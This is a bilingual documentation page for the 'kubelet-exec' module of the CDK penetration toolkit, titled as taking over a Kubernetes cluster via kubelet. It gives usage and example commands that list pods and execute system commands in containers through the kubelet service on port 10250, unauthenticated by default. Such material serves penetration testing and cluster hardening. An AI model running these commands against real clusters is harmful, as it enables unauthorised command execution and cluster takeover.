---
title: 利用kubelet接管K8s集群
author: 404tk
date: 2022-06-27
category: Kubernetes
layout: post
---

Exploit: kubelet-exec
-------------
Use the default '10250' port 'kubelet' service to list pods running in the cluster.  
By default, unauthorized access is supported. The token can be entered optionally.   

利用默认`10250`端口`kubelet`服务列举集群中运行的pods，支持指定pods执行系统命令并回显。  
默认支持未授权访问利用，token可选择性填写。  

Usage
-------------
```shell
./cdk run kubelet-exec (list|exec) <endpoint>/<namespace>/<pod>/<container> <token>
```  

Example
-------------
```shell
./cdk run kubelet-exec list http://172.16.61.10:10250
./cdk run kubelet-exec exec https://172.16.61.10:10250/kube-system/test1/test "ip addr"
```  
![](/assets/images/kubelet_exec.png)